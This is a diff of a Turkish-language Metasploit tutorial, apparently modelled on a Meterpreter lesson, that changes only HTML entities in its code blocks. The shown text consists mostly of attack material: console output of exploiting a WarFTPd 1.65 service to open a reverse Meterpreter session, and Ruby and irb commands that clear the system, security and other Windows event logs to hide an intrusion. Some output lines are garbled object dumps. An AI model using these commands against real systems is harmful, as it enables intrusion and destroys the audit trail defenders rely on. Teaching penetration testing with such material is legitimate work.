@@ -41,7 +41,7 @@ def clrevtlgs**()**
       file_local_write**(**@dest,"Cleared the #{evl} Event Log"**)**
     end
     print_status**(**"All Event Logs have been cleared"**)**
-  rescue ::Exception **=&gt;** e
+  rescue ::Exception **=>** e
     print_status**(**"Error clearing Event Log: #{e.class} #{e}"**)**
 
   end
@@ -74,7 +74,7 @@ Biz sadece ‘system’ loglarını temizlemek istediğimizden yukarıdaki döng
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** **&gt;** exploit
+msf exploit**(**warftpd_165_user**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
@@ -86,7 +86,7 @@ msf exploit**(**warftpd_165_user**)** **&gt;** exploit
 **[*********]** Sleeping before handling stage...
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
-**[*********]** Meterpreter session 2 opened **(**172.16.104.130:4444 -&gt; 172.16.104.145:1246**)**
+**[*********]** Meterpreter session 2 opened **(**172.16.104.130:4444 -> 172.16.104.145:1246**)**
 ```
 
 
@@ -95,13 +95,13 @@ Ardından meterpreter shell içerisinden Ruby kodlayıcısını `irb` komutuyla 
 
 
 ```bash
-meterpreter **&gt;** irb
+meterpreter **>** irb
 **[*********]** Starting IRB shell
 **[*********]** The 'client' variable holds the meterpreter client
-**&gt;&gt;** log **=** client.sys.eventlog.open**(**'system'**)**
-**=&gt;** #&gt;#:0xb6779424 @client=#&gt;, #&gt;, #
+**>>** log **=** client.sys.eventlog.open**(**'system'**)**
+**=>** #>#:0xb6779424 @client=#>, #>, #
 
-"windows/browser/facebook_extractiptc"**=&gt;**#, "windows/antivirus/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#
+"windows/browser/facebook_extractiptc"**=>**#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
 ```
 
 
@@ -110,10 +110,10 @@ meterpreter **&gt;** irb
 
 
 ```bash
-**&gt;&gt;** log.clear
-**=&gt;** #&gt;#:0xb6779424 @client=#&gt;,
+**>>** log.clear
+**=>** #>#:0xb6779424 @client=#>,
 
-/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#
+/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
 ```
 
 
@@ -157,7 +157,7 @@ Artık bu yeni oluşturduğunuz Script kodlarını yeni açtığınız Meterpret
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** **&gt;** exploit
+msf exploit**(**warftpd_165_user**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
@@ -169,9 +169,9 @@ msf exploit**(**warftpd_165_user**)** **&gt;** exploit
 **[*********]** Sleeping before handling stage...
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
-**[*********]** Meterpreter session 1 opened **(**172.16.104.130:4444 -&gt; 172.16.104.145:1253**)**
+**[*********]** Meterpreter session 1 opened **(**172.16.104.130:4444 -> 172.16.104.145:1253**)**
 
-meterpreter **&gt;** run clearlogs
+meterpreter **>** run clearlogs
 Clearing Event Logs, this will leave an event 517
 **[*********]** Clearing the security Event Log
 **[*********]** Clearing the system Event Log
@@ -180,7 +180,7 @@ Clearing Event Logs, this will leave an event 517
 **[*********]** Clearing the dns server Event Log
 **[*********]** Clearing the file replication service Event Log
 All Clear! You are a Ninja!
-meterpreter **&gt;** exit
+meterpreter **>** exit
 ```
 
 
